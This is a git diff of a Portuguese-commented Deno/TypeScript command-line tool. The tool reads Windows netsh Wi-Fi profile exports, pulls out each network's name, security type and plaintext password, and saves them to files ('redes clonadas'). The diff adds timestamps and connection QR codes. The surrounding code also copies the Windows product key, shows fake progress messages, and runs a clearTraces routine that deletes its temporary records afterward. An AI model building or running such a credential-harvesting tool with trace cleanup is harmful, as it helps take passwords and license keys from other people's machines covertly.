@@ -1,7 +1,9 @@
 import { SpinnerTypes, TerminalSpinner } from '@spinners';
 import { Select } from '@cliffy/select';
+import { DateTime } from '@luxon';
 import colors from '@colors';
 import { delay } from '@std';
+import qr from '@qrcode';
 
 // Title.txt contém uma string colorida bem cringe
 const title: string = await Deno.readTextFile('Title.txt')
@@ -91,6 +93,11 @@ async function NetSHProfileCollector() {
 	// e eu não quis quebrar a cabeça com algo tão fútil quanto pegar o length disso
 	let counter = 0;
 
+	const timestamp = DateTime.now()
+		.setZone('America/Sao_Paulo')
+		.setLocale('pt')
+		.toFormat('DDDD');
+
 	// Por padrão, A API fornece as informações em arquivos XML bem poluídos
 	// Então eu fiz essa bosta aqui pra deixar só o que é realmente importante
 	for await (const file of Deno.readDir('.tempdata')) {
@@ -100,22 +107,32 @@ async function NetSHProfileCollector() {
 		const content = await Deno.readTextFile(`.tempdata/${file.name}`);
 
 		// Filtrando tags que são úteis
-		const [name, , security, password] = clearTags(content.matchAll(
+		const [SSID, , security, password] = clearTags(content.matchAll(
 			/<(name|authentication|keyMaterial)>.*?<\/.*>/g,
 		));
 
+		// Gerando QR Code para conectar
+		let wifiQR;
+		qr.generate(
+			`WIFI:S:${SSID};T:${security};P:${password};H:false;;`,
+			{
+				small: true,
+			},
+			(qrCode: string) => wifiQR = qrCode,
+		);
+
 		// Escrevendo arquivos com as informações filtradas no diretório final
 		Deno.writeTextFileSync(
-			`WiFiPasswords/${name}.txt`,
-			`SSID: ${name}\nSecurity Level: ${security}\nPassword: ${password}`,
+			`WiFiPasswords/${SSID}.txt`,
+			`SSID: ${SSID}\nData: ${timestamp}\nSegurança: ${security}\nSenha: ${password}\n\n${wifiQR}`,
 		);
 	}
 
 	spinner.end(`${counter} redes clonadas.`);
 
-	await delay(1_000);
 	await clearTraces(); // Limpar registros
-	return;
+
+	Deno.exit(); // Encerra o processo pra agilizar
 }
 
 async function copyWinKey() {
@@ -146,7 +163,7 @@ async function clearTraces() {
 	currentMenu = 'CLEANER';
 
 	const status = new Spinner('Apagando registros...');
-	await delay(1_500);
+	await delay(random(500, 3_000));
 
 	Deno.remove('.tempdata', { recursive: true })
 		// 'recursive' significa que é pra apagar mesmo se tiver arquivos dentro
@@ -171,14 +188,6 @@ async function executeCommand(cmd: string) {
 	return res;
 }
 
-async function createFakeStatus(loadingMsg: string, completeMsg: string) {
-	const status = new Spinner(loadingMsg, currentMenu);
-
-	await delay(random());
-	status.end(completeMsg);
-	return;
-}
-
 function clearTags(matches: IterableIterator<RegExpMatchArray>) {
 	// Regex pra filtrar as tags do XML
 	const res: string[] = [];
@@ -191,10 +200,17 @@ function clearTags(matches: IterableIterator<RegExpMatchArray>) {
 	return res;
 }
 
-function random() {
-	// Retorna um número aleatório menor que 3000 e maior que 500
-	const value = Math.floor(Math.random() * 3_000);
-	return value < 500 ? value + 1_000 : value;
+async function createFakeStatus(loadingMsg: string, completeMsg: string) {
+	const status = new Spinner(loadingMsg, currentMenu);
+
+	await delay(random(1_000, 3_500));
+	status.end(completeMsg);
+	return;
+}
+
+function random(min: number, max: number) {
+	// Retorna um número aleatório entre min e max
+	return Math.floor(Math.random() * (max - min) + min);
 }
 
 class Spinner {
